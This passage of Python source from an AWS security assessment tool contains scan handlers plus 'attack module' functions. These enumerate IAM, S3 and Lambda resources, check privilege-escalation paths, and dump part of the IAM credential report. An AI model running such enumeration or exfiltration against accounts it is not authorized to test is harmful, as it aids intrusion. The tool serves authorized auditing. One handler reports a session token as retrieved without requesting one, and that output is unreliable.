async def run_full_cloudfront_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full CloudFront scan."""
    scanner = CloudFrontScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-cloudfront-scan", findings)
    return findings


async def run_full_kms_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run full KMS scan."""
    scanner = KMSScanner(auth_manager)
    findings = []
    await scanner.scan("tui-full-kms-scan", findings)
    return findings


async def run_sts_get_caller_identity(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Get caller identity."""
    try:
        identity = auth_manager.get_caller_identity()
        return [{
            "title": "AWS Caller Identity",
            "description": f"Account: {identity.get('Account', 'Unknown')}, ARN: {identity.get('Arn', 'Unknown')}, UserId: {identity.get('UserId', 'Unknown')}",
            "severity": "info",
            "category": "informational",
            "resource_type": "aws_account",
            "resource_id": identity.get("Account", ""),
            "resource_name": identity.get("Arn", "AWS Account"),
            "region": "global",
            "rule_id": "sts_get_caller_identity",
        }]
    except Exception as e:
        return _handle_aws_error("sts:GetCallerIdentity", e)


async def run_sts_check_assume_role(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check assumable roles."""
    scanner = STSScanner(auth_manager)
    findings = []
    await scanner.scan("tui-sts-assume-role-check", findings)
    return findings


async def run_sts_get_session_token(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Get session token."""
    try:
        # This would use STS to get session token
        return [{
            "title": "STS Session Token",
            "description": "Session token retrieved successfully",
            "severity": "info",
            "category": "auth",
            "resource_type": "sts_token",
            "resource_id": "session",
            "resource_name": "Session Token",
            "region": "global",
            "rule_id": "sts_get_session_token",
        }]
    except Exception as e:
        return _handle_aws_error("sts:GetSessionToken", e)


# Cross-service search handlers
async def run_search_encryption(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Cross-service encryption checks."""
    all_findings = []
    # S3 encryption
    s3_scanner = S3Scanner(auth_manager)
    await s3_scanner.scan("tui-search-encryption", all_findings)
    # EC2 encryption
    ec2_scanner = EC2Scanner(auth_manager)
    await ec2_scanner._scan_volumes("tui-search-encryption", all_findings, _create_scan_result("iam"))
    await ec2_scanner._scan_snapshots("tui-search-encryption", all_findings, _create_scan_result("iam"))
    # Secrets Manager encryption
    secrets_scanner = SecretsScanner(auth_manager)
    await secrets_scanner.scan("tui-search-encryption", all_findings)
    # Lambda encryption (environment variables)
    lambda_scanner = LambdaScanner(auth_manager)
    await lambda_scanner._scan_functions("tui-search-encryption", all_findings, _create_scan_result("iam"))
    # RDS encryption
    rds_scanner = RDSScanner(auth_manager)
    await rds_scanner.scan("tui-search-encryption", all_findings)
    # DynamoDB encryption
    dynamodb_scanner = DynamoDBScanner(auth_manager)
    await dynamodb_scanner.scan("tui-search-encryption", all_findings)
    # KMS key rotation
    kms_scanner = KMSScanner(auth_manager)
    await kms_scanner.scan("tui-search-encryption", all_findings)

    # Filter to encryption findings
    enc_findings = [f for f in all_findings if f.get("category") in ("encryption_missing", "weak_configuration") and "encrypt" in f.get("rule_id", "").lower()]
    return enc_findings


async def run_search_public(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Cross-service public exposure checks."""
    all_findings = []
    # S3 public access
    s3_scanner = S3Scanner(auth_manager)
    await s3_scanner.scan("tui-search-public", all_findings)
    # EC2 public IPs and SGs
    ec2_scanner = EC2Scanner(auth_manager)
    await ec2_scanner._scan_instances("tui-search-public", all_findings, _create_scan_result("iam"))
    await ec2_scanner._scan_security_groups("tui-search-public", all_findings, _create_scan_result("iam"))
    await ec2_scanner._scan_amis("tui-search-public", all_findings, _create_scan_result("iam"))
    await ec2_scanner._scan_snapshots("tui-search-public", all_findings, _create_scan_result("iam"))
    # Lambda public policies
    lambda_scanner = LambdaScanner(auth_manager)
    await lambda_scanner._scan_functions("tui-search-public", all_findings, _create_scan_result("iam"))
    # Beanstalk public endpoints
    beanstalk_scanner = BeanstalkScanner(auth_manager)
    await beanstalk_scanner.scan("tui-search-public", all_findings)
    # RDS public access
    rds_scanner = RDSScanner(auth_manager)
    await rds_scanner.scan("tui-search-public", all_findings)
    # CloudFront public access
    cloudfront_scanner = CloudFrontScanner(auth_manager)
    await cloudfront_scanner.scan("tui-search-public", all_findings)

    # Filter to public exposure findings
    public_findings = [f for f in all_findings if f.get("category") in ("data_exposure", "network_exposure", "weak_configuration") and ("public" in f.get("rule_id", "").lower() or "exposed" in f.get("rule_id", "").lower())]
    return public_findings


async def run_search_privesc(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Cross-service privilege escalation checks."""
    all_findings = []
    # IAM privesc
    iam_scanner = IAMScanner(auth_manager)
    await iam_scanner.scan("tui-search-privesc", all_findings)
    # EC2 instance profiles
    ec2_scanner = EC2Scanner(auth_manager)
    await ec2_scanner._scan_instances("tui-search-privesc", all_findings, _create_scan_result("iam"))
    # Lambda role permissions
    lambda_scanner = LambdaScanner(auth_manager)
    await lambda_scanner._scan_functions("tui-search-privesc", all_findings, _create_scan_result("iam"))
    # ECS task roles
    ecs_scanner = ECSScanner(auth_manager)
    await ecs_scanner.scan("tui-search-privesc", all_findings)
    # Cognito identity pool roles
    cognito_scanner = CognitoScanner(auth_manager)
    await cognito_scanner.scan("tui-search-privesc", all_findings)
    # EKS cluster roles
    eks_scanner = EKSScanner(auth_manager)
    await eks_scanner.scan("tui-search-privesc", all_findings)

    # Filter to privilege escalation findings
    privesc_findings = [f for f in all_findings if f.get("category") == "privilege_escalation"]
    return privesc_findings


async def run_search_secrets(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Find secrets across services."""
    all_findings = []
    # Lambda env vars
    lambda_scanner = LambdaScanner(auth_manager)
    await lambda_scanner._scan_functions("tui-search-secrets", all_findings, _create_scan_result("iam"))
    # Secrets Manager
    secrets_scanner = SecretsScanner(auth_manager)
    await secrets_scanner.scan("tui-search-secrets", all_findings)
    # EC2 user data
    ec2_scanner = EC2Scanner(auth_manager)
    await ec2_scanner._scan_instances("tui-search-secrets", all_findings, _create_scan_result("iam"))
    # Beanstalk environment variables
    beanstalk_scanner = BeanstalkScanner(auth_manager)
    await beanstalk_scanner.scan("tui-search-secrets", all_findings)
    # RDS instance environment
    rds_scanner = RDSScanner(auth_manager)
    await rds_scanner.scan("tui-search-secrets", all_findings)

    # Filter to secrets findings
    secret_findings = [f for f in all_findings if f.get("category") == "secrets_exposure"]
    return secret_findings


def display_and_save_results(findings: list[dict], console: Console, module_name: str, profile: str = None, service: str = None) -> None:
    """Display findings in Prowl-style clean text output and save to output folder."""
    display = ProwlDisplay(console, module_name)

    if not findings:
        display.info("No findings - all checks passed!")
        return

    # Determine resource type from first finding
    resource_type = "finding"
    if findings:
        rt = findings[0].get("resource_type", "")
        if rt:
            resource_type = rt.replace("_", " ").rstrip("s")

    # Print findings in Prowl style - DETAILED like Prowl
    display.print_findings_detailed(findings, resource_type)

    # Print module summary
    display.print_summary(module_name)

    # Save results to output folder
    save_findings_to_output(findings, module_name, profile=profile, service=service)


def save_findings_to_output(findings: list[dict], module_name: str, export_csv: bool = False, profile: str = None, service: str = None) -> None:
    """Save findings to output folder."""
    try:
        config = get_config()
        output_dir = Path(config.output.output_dir)
        if profile:
            output_dir = output_dir / profile
        output_dir.mkdir(parents=True, exist_ok=True)

        timestamp = datetime.now(timezone.utc).strftime('%Y%m%d-%H%M%S')
        if service:
            json_file = output_dir / f"{service}_{module_name}-{timestamp}.json"
        else:
            json_file = output_dir / f"awsprowl-{module_name}-{timestamp}.json"

        import json
        output_data = {
            "module": module_name,
            "timestamp": timestamp,
            "findings_count": len(findings),
            "findings": findings,
        }
        with open(json_file, "w") as f:
            json.dump(output_data, f, indent=2, default=str)

        console = Console()
        display = ProwlDisplay(console, module_name)
        display.info(f"Results saved to: {json_file}")

        if export_csv and findings:
            export_findings_to_csv(findings, module_name, output_dir, timestamp)

    except Exception as e:
        log.error("Failed to save results: {}", e)


def export_findings_to_csv(findings: list[dict], module_name: str, output_dir: Path, timestamp: str) -> None:
    """Export findings to CSV format."""
    try:
        csv_file = output_dir / f"awsprowl-{module_name}-{timestamp}.csv"

        if not findings:
            return

        # Define CSV columns
        fieldnames = [
            "id", "title", "description", "severity", "category",
            "resource_type", "resource_id", "resource_name", "region", "account_id",
            "scan_id", "rule_id", "status", "tags", "created_at", "updated_at",
            "cvss_score", "cvss_vector", "destructive"
        ]

        with open(csv_file, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
            writer.writeheader()

            for finding in findings:
                # Flatten finding for CSV
                row = {
                    "id": finding.get("id", ""),
                    "title": finding.get("title", ""),
                    "description": finding.get("description", ""),
                    "severity": finding.get("severity", "info"),
                    "category": finding.get("category", "informational"),
                    "resource_type": finding.get("resource_type", "other"),
                    "resource_id": finding.get("resource_id", ""),
                    "resource_name": finding.get("resource_name", ""),
                    "region": finding.get("region", ""),
                    "account_id": finding.get("account_id", ""),
                    "scan_id": finding.get("scan_id", ""),
                    "rule_id": finding.get("rule_id", ""),
                    "status": finding.get("status", "open"),
                    "tags": ",".join(finding.get("tags", [])) if finding.get("tags") else "",
                    "created_at": finding.get("created_at", ""),
                    "updated_at": finding.get("updated_at", ""),
                    "cvss_score": finding.get("cvss_score", ""),
                    "cvss_vector": finding.get("cvss_vector", ""),
                    "destructive": finding.get("destructive", False),
                }
                writer.writerow(row)

        console = Console()
        display = ProwlDisplay(console, module_name)
        display.info(f"CSV exported to: {csv_file}")
    except Exception as e:
        log.error("Failed to export CSV: {}", e)


# ============================================================================
# ATTACK MODULE HANDLERS
# ============================================================================

# --- IAM ENUM HANDLERS (Read-only) ---

async def run_iam_enum_users(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate IAM users with details."""
    scanner = IAMScanner(auth_manager)
    findings = []
    # Use the full scan to get user details
    await scanner._scan_users("tui-iam-enum-users", findings, _create_scan_result("iam"))
    return findings


async def run_iam_enum_roles(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate IAM roles."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_roles("tui-iam-enum-roles", findings, _create_scan_result("iam"))
    return findings


async def run_iam_enum_policies(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate IAM policies."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_policies("tui-iam-enum-policies", findings, _create_scan_result("iam"))
    return findings


async def run_iam_enum_groups(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate IAM groups."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_groups("tui-iam-enum-groups", findings, _create_scan_result("iam"))
    return findings


async def run_iam_enum_account_authorization(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """GetAccountAuthorizationDetails - comprehensive snapshot."""
    scanner = IAMScanner(auth_manager)
    findings = []
    try:
        response = scanner.client.get_account_authorization_details()
        findings.append({
            "title": "Account Authorization Details",
            "description": f"Users: {len(response.get('UserDetailList', []))}, Roles: {len(response.get('RoleDetailList', []))}, Groups: {len(response.get('GroupDetailList', []))}, Policies: {len(response.get('Policies', []))}",
            "severity": "info",
            "category": "informational",
            "resource_type": "iam_account_authorization",
            "resource_id": "account",
            "resource_name": "Account Authorization",
            "region": "global",
            "rule_id": "iam_enum_account_authorization",
        })
    except Exception as e:
        return _handle_aws_error("iam:GetAccountAuthorizationDetails", e)
    return findings


async def run_iam_enum_password_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Get account password policy."""
    scanner = IAMScanner(auth_manager)
    findings = []
    try:
        response = scanner.client.get_account_password_policy()
        policy = response.get("PasswordPolicy", {})
        findings.append({
            "title": "Account Password Policy",
            "description": f"MinLength: {policy.get('MinimumPasswordLength')}, RequireSymbols: {policy.get('RequireSymbols')}, RequireNumbers: {policy.get('RequireNumbers')}, RequireUppercase: {policy.get('RequireUppercase')}, RequireLowercase: {policy.get('RequireLowercase')}, MaxAge: {policy.get('MaxPasswordAge')}, ReusePrevention: {policy.get('PasswordReusePrevention')}",
            "severity": "info",
            "category": "informational",
            "resource_type": "iam_password_policy",
            "resource_id": "account",
            "resource_name": "Password Policy",
            "region": "global",
            "rule_id": "iam_enum_password_policy",
        })
    except Exception as e:
        return _handle_aws_error("iam:GetAccountPasswordPolicy", e)
    return findings


async def run_iam_enum_account_aliases(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List account aliases."""
    scanner = IAMScanner(auth_manager)
    findings = []
    try:
        response = scanner.client.list_account_aliases()
        for alias in response.get("AccountAliases", []):
            findings.append({
                "title": f"Account Alias: {alias}",
                "description": f"AWS Account Alias: {alias}",
                "severity": "info",
                "category": "informational",
                "resource_type": "iam_account_alias",
                "resource_id": alias,
                "resource_name": alias,
                "region": "global",
                "rule_id": "iam_enum_account_aliases",
            })
    except Exception as e:
        return _handle_aws_error("iam:ListAccountAliases", e)
    return findings


async def run_iam_enum_service_linked_roles(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List service-linked roles."""
    scanner = IAMScanner(auth_manager)
    findings = []
    try:
        response = scanner.client.list_service_linked_roles()
        for role in response.get("Roles", []):
            findings.append({
                "title": f"Service-Linked Role: {role['RoleName']}",
                "description": f"ARN: {role['Arn']}, Service: {role.get('Path', '').split('/')[1] if '/' in role.get('Path', '') else 'unknown'}",
                "severity": "info",
                "category": "informational",
                "resource_type": "iam_service_linked_role",
                "resource_id": role["RoleName"],
                "resource_name": role["RoleName"],
                "region": "global",
                "rule_id": "iam_enum_service_linked_roles",
            })
    except Exception as e:
        return _handle_aws_error("iam:ListServiceLinkedRoles", e)
    return findings


async def run_iam_enum_org_accounts(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List AWS Organization accounts."""
    from awsprowl.aws.organizations import OrganizationsScanner
    scanner = OrganizationsScanner(auth_manager)
    findings = []
    try:
        await scanner.scan("tui-iam-enum-org-accounts", findings)
    except Exception as e:
        return _handle_aws_error("organizations:ListAccounts", e)
    return findings


async def run_iam_enum_cross_account_trusts(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Analyze cross-account trust relationships."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_roles("tui-iam-enum-cross-account-trusts", findings, _create_scan_result("iam"))
    # Filter to cross-account trust findings
    cross_account = [f for f in findings if "cross_account" in f.get("rule_id", "").lower() or "trust" in f.get("rule_id", "").lower()]
    return cross_account


# --- EC2 ENUM HANDLERS (Read-only) ---

async def run_ec2_enum_resources(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate all EC2 resources."""
    scanner = EC2Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-ec2-enum-resources", findings)
    return findings


# --- S3 ENUM HANDLERS (Read-only) ---

async def run_s3_enum_buckets(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate S3 buckets."""
    scanner = S3Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-s3-enum-buckets", findings)
    return findings


async def run_s3_enum_objects(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate S3 objects."""
    scanner = S3Scanner(auth_manager)
    findings = []
    try:
        response = scanner.client.list_buckets()
        for bucket in response.get("Buckets", []):
            bucket_name = bucket["Name"]
            paginator = scanner.client.get_paginator("list_objects_v2")
            for page in paginator.paginate(Bucket=bucket_name, MaxKeys=100):
                for obj in page.get("Contents", []):
                    findings.append({
                        "title": f"S3 Object: {obj['Key']}",
                        "description": f"Bucket: {bucket_name}, Size: {obj.get('Size', 0)} bytes, Modified: {obj.get('LastModified', 'N/A')}",
                        "severity": "info",
                        "category": "informational",
                        "resource_type": "s3_object",
                        "resource_id": obj["Key"],
                        "resource_name": obj["Key"],
                        "region": scanner.region,
                        "rule_id": "s3_enum_objects",
                    })
    except Exception as e:
        return _handle_aws_error("s3:ListObjects", e)
    return findings


async def run_s3_enum_bucket_policies(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate S3 bucket policies."""
    scanner = S3Scanner(auth_manager)
    findings = []
    try:
        response = scanner.client.list_buckets()
        for bucket in response.get("Buckets", []):
            bucket_name = bucket["Name"]
            try:
                policy = scanner.client.get_bucket_policy(Bucket=bucket_name)
                findings.append({
                    "title": f"S3 Bucket Policy: {bucket_name}",
                    "description": f"Policy: {policy.get('Policy', 'N/A')[:200]}...",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "s3_bucket_policy",
                    "resource_id": bucket_name,
                    "resource_name": bucket_name,
                    "region": scanner.region,
                    "rule_id": "s3_enum_bucket_policies",
                })
            except Exception as e:
                if "NoSuchBucketPolicy" not in str(e):
                    return _handle_aws_error("s3:GetBucketPolicy", e)
    except Exception as e:
        return _handle_aws_error("s3:ListBuckets", e)
    return findings


# --- LAMBDA ENUM HANDLERS (Read-only) ---

async def run_lambda_enum_functions(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate Lambda functions."""
    scanner = LambdaScanner(auth_manager)
    findings = []
    await scanner._scan_functions("tui-lambda-enum-functions", findings, _create_scan_result("iam"))
    return findings


async def run_lambda_enum_layers(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate Lambda layers."""
    scanner = LambdaScanner(auth_manager)
    findings = []
    await scanner._scan_layers("tui-lambda-enum-layers", findings, _create_scan_result("iam"))
    return findings


async def run_lambda_enum_event_source_mappings(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate Lambda event source mappings."""
    scanner = LambdaScanner(auth_manager)
    findings = []
    try:
        paginator = scanner.client.get_paginator("list_event_source_mappings")
        for page in paginator.paginate():
            for mapping in page.get("EventSourceMappings", []):
                findings.append({
                    "title": f"Event Source Mapping: {mapping['UUID']}",
                    "description": f"Function: {mapping.get('FunctionArn', 'N/A')}, Source: {mapping.get('EventSourceArn', 'N/A')}, State: {mapping.get('State', 'N/A')}",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "lambda_event_source_mapping",
                    "resource_id": mapping["UUID"],
                    "resource_name": mapping["UUID"],
                    "region": scanner.region,
                    "rule_id": "lambda_enum_event_source_mappings",
                })
    except Exception as e:
        return _handle_aws_error("lambda:ListEventSourceMappings", e)
    return findings


# --- STS ENUM HANDLERS (Read-only) ---

async def run_sts_enum_caller_identity(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Get caller identity."""
    return await run_sts_get_caller_identity(auth_manager, **kwargs)


async def run_sts_enum_assumable_roles(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate assumable roles."""
    return await run_sts_check_assume_role(auth_manager, **kwargs)


# --- IAM PRIVESC HANDLERS (Read-only analysis) ---

async def run_iam_privesc_full_scan(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Full privilege escalation scan."""
    return await run_iam_check_privilege_escalation(auth_manager, **kwargs)


async def run_iam_privesc_create_access_key(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check CreateAccessKey privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_users("tui-iam-privesc-create-access-key", findings, _create_scan_result("iam"))
    await scanner._scan_roles("tui-iam-privesc-create-access-key", findings, _create_scan_result("iam"))
    # Filter to create access key findings
    return [f for f in findings if "create_access_key" in f.get("rule_id", "").lower()]


async def run_iam_privesc_create_login_profile(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check CreateLoginProfile privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_users("tui-iam-privesc-create-login-profile", findings, _create_scan_result("iam"))
    return [f for f in findings if "create_login_profile" in f.get("rule_id", "").lower()]


async def run_iam_privesc_attach_user_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check AttachUserPolicy privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_users("tui-iam-privesc-attach-user-policy", findings, _create_scan_result("iam"))
    await scanner._scan_policies("tui-iam-privesc-attach-user-policy", findings, _create_scan_result("iam"))
    return [f for f in findings if "attach_user_policy" in f.get("rule_id", "").lower()]


async def run_iam_privesc_put_user_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check PutUserPolicy privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_users("tui-iam-privesc-put-user-policy", findings, _create_scan_result("iam"))
    return [f for f in findings if "put_user_policy" in f.get("rule_id", "").lower()]


async def run_iam_privesc_attach_role_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check AttachRolePolicy privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_roles("tui-iam-privesc-attach-role-policy", findings, _create_scan_result("iam"))
    await scanner._scan_policies("tui-iam-privesc-attach-role-policy", findings, _create_scan_result("iam"))
    return [f for f in findings if "attach_role_policy" in f.get("rule_id", "").lower()]


async def run_iam_privesc_put_role_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check PutRolePolicy privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_roles("tui-iam-privesc-put-role-policy", findings, _create_scan_result("iam"))
    return [f for f in findings if "put_role_policy" in f.get("rule_id", "").lower()]


async def run_iam_privesc_create_policy_version(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check CreatePolicyVersion privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_policies("tui-iam-privesc-create-policy-version", findings, _create_scan_result("iam"))
    return [f for f in findings if "create_policy_version" in f.get("rule_id", "").lower()]


async def run_iam_privesc_create_role(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check CreateRole privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_roles("tui-iam-privesc-create-role", findings, _create_scan_result("iam"))
    return [f for f in findings if "create_role" in f.get("rule_id", "").lower()]


async def run_iam_privesc_update_assume_role_policy(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check UpdateAssumeRolePolicy privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_roles("tui-iam-privesc-update-assume-role-policy", findings, _create_scan_result("iam"))
    return [f for f in findings if "update_assume_role_policy" in f.get("rule_id", "").lower()]


async def run_iam_privesc_pass_role(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check PassRole privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_users("tui-iam-privesc-pass-role", findings, _create_scan_result("iam"))
    await scanner._scan_roles("tui-iam-privesc-pass-role", findings, _create_scan_result("iam"))
    return [f for f in findings if "pass_role" in f.get("rule_id", "").lower()]


async def run_iam_privesc_add_user_to_group(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check AddUserToGroup privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_groups("tui-iam-privesc-add-user-to-group", findings, _create_scan_result("iam"))
    return [f for f in findings if "add_user_to_group" in f.get("rule_id", "").lower()]


async def run_iam_privesc_service_linked_roles(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check service-linked role privesc."""
    scanner = IAMScanner(auth_manager)
    findings = []
    await scanner._scan_roles("tui-iam-privesc-service-linked-roles", findings, _create_scan_result("iam"))
    return [f for f in findings if "service_linked" in f.get("rule_id", "").lower()]


async def run_iam_privesc_org_takeover(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Check organization takeover paths."""
    from awsprowl.aws.organizations import OrganizationsScanner
    scanner = OrganizationsScanner(auth_manager)
    findings = []
    try:
        await scanner.scan("tui-iam-privesc-org-takeover", findings)
    except Exception as e:
        return _handle_aws_error("organizations:ListAccounts", e)
    return findings


# --- EC2 PRIVESC HANDLERS (Read-only analysis) ---

async def run_ec2_privesc_analysis(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Analyze EC2 for privilege escalation."""
    scanner = EC2Scanner(auth_manager)
    findings = []
    await scanner._scan_instances("tui-ec2-privesc-analysis", findings, _create_scan_result("iam"))
    return [f for f in findings if f.get("category") == "privilege_escalation"]


# --- S3 PRIVESC HANDLERS (Read-only analysis) ---

async def run_s3_privesc_analysis(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Analyze S3 for privilege escalation."""
    scanner = S3Scanner(auth_manager)
    findings = []
    await scanner.scan("tui-s3-privesc-analysis", findings)
    return [f for f in findings if f.get("category") == "privilege_escalation"]


# --- LAMBDA PRIVESC HANDLERS (Read-only analysis) ---

async def run_lambda_privesc_analysis(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Analyze Lambda for privilege escalation."""
    scanner = LambdaScanner(auth_manager)
    findings = []
    await scanner._scan_functions("tui-lambda-privesc-analysis", findings, _create_scan_result("iam"))
    return [f for f in findings if f.get("category") == "privilege_escalation"]


# --- CODEBUILD PRIVESC HANDLERS (Read-only analysis) ---

async def run_codebuild_privesc_analysis(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Analyze CodeBuild for privilege escalation."""
    from awsprowl.aws.codebuild import CodeBuildScanner
    scanner = CodeBuildScanner(auth_manager)
    findings = []
    try:
        await scanner.scan("tui-codebuild-privesc-analysis", findings)
    except Exception as e:
        return _handle_aws_error("codebuild:ListProjects", e)
    return [f for f in findings if f.get("category") == "privilege_escalation"]


# --- VPC PRIVESC HANDLERS (Read-only analysis) ---

async def run_vpc_privesc_analysis(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Analyze VPC for privilege escalation."""
    from awsprowl.aws.vpc import VPCScanner
    scanner = VPCScanner(auth_manager)
    findings = []
    try:
        await scanner.scan("tui-vpc-privesc-analysis", findings)
    except Exception as e:
        return _handle_aws_error("ec2:DescribeVpcs", e)
    return [f for f in findings if f.get("category") == "privilege_escalation"]


# --- ALL PRIVESC HANDLER (Comprehensive cross-service) ---

async def run_all_privesc(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Run ALL privilege escalation modules across ALL services.

    This runs every privesc check available:
    - IAM: Full scan, CreateAccessKey, CreateLoginProfile, AttachUserPolicy, PutUserPolicy,
           AttachRolePolicy, PutRolePolicy, CreatePolicyVersion, CreateRole,
           UpdateAssumeRolePolicy, PassRole, AddUserToGroup, ServiceLinkedRoles, OrgTakeover
    - EC2: Instance profile analysis
    - S3: Bucket policy analysis
    - Lambda: Function role permissions
    - CodeBuild: Project role permissions
    - VPC: Network configuration analysis
    """
    all_findings = []

    # IAM Privesc modules
    iam_modules = [
        ("iam_privesc_full_scan", run_iam_privesc_full_scan),
        ("iam_privesc_create_access_key", run_iam_privesc_create_access_key),
        ("iam_privesc_create_login_profile", run_iam_privesc_create_login_profile),
        ("iam_privesc_attach_user_policy", run_iam_privesc_attach_user_policy),
        ("iam_privesc_put_user_policy", run_iam_privesc_put_user_policy),
        ("iam_privesc_attach_role_policy", run_iam_privesc_attach_role_policy),
        ("iam_privesc_put_role_policy", run_iam_privesc_put_role_policy),
        ("iam_privesc_create_policy_version", run_iam_privesc_create_policy_version),
        ("iam_privesc_create_role", run_iam_privesc_create_role),
        ("iam_privesc_update_assume_role_policy", run_iam_privesc_update_assume_role_policy),
        ("iam_privesc_pass_role", run_iam_privesc_pass_role),
        ("iam_privesc_add_user_to_group", run_iam_privesc_add_user_to_group),
        ("iam_privesc_service_linked_roles", run_iam_privesc_service_linked_roles),
        ("iam_privesc_org_takeover", run_iam_privesc_org_takeover),
    ]

    for module_name, handler in iam_modules:
        try:
            findings = await handler(auth_manager, **kwargs)
            for f in findings:
                f["source_module"] = module_name
            all_findings.extend(findings)
        except Exception as e:
            log.debug("IAM privesc module %s failed: %s", module_name, e)

    # Cross-service privesc modules
    cross_modules = [
        ("ec2_privesc_analysis", run_ec2_privesc_analysis),
        ("s3_privesc_analysis", run_s3_privesc_analysis),
        ("lambda_privesc_analysis", run_lambda_privesc_analysis),
        ("codebuild_privesc_analysis", run_codebuild_privesc_analysis),
        ("vpc_privesc_analysis", run_vpc_privesc_analysis),
    ]

    for module_name, handler in cross_modules:
        try:
            findings = await handler(auth_manager, **kwargs)
            for f in findings:
                f["source_module"] = module_name
            all_findings.extend(findings)
        except Exception as e:
            log.debug("Cross-service privesc module %s failed: %s", module_name, e)

    return all_findings


# --- IAM EXFIL HANDLERS (Read-only) ---

async def run_iam_exfil_credential_report(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Generate and download IAM credential report."""
    scanner = IAMScanner(auth_manager)
    findings = []
    try:
        # Generate report
        scanner.client.generate_credential_report()
        import time
        time.sleep(2)  # Wait for report generation
        response = scanner.client.get_credential_report()
        content = response.get("Content", b"").decode("utf-8")
        findings.append({
            "title": "IAM Credential Report",
            "description": f"Credential report generated ({len(content)} bytes). First 500 chars:\n{content[:500]}",
            "severity": "info",
            "category": "informational",
            "resource_type": "iam_credential_report",
            "resource_id": "credential_report",
            "resource_name": "Credential Report",
            "region": "global",
            "rule_id": "iam_exfil_credential_report",
        })
    except Exception as e:
        return _handle_aws_error("iam:GetCredentialReport", e)
    return findings


# --- S3 EXFIL HANDLERS ---

async def run_s3_exfil_metadata(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Extract S3 metadata (read-only)."""
    return await run_s3_enum_buckets(auth_manager, **kwargs)


async def run_s3_exfil_download_objects(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Download S3 objects - DESTRUCTIVE, requires confirmation."""
    findings = []
    findings.append({
        "title": "S3 Exfiltration - Download Objects",
        "description": "WARNING: This module downloads S3 object contents. This is a DESTRUCTIVE operation that may incur data transfer costs and expose sensitive data. Use only with explicit authorization.",
        "severity": "high",
        "category": "data_exfiltration",
        "resource_type": "s3_exfil",
        "resource_id": "warning",
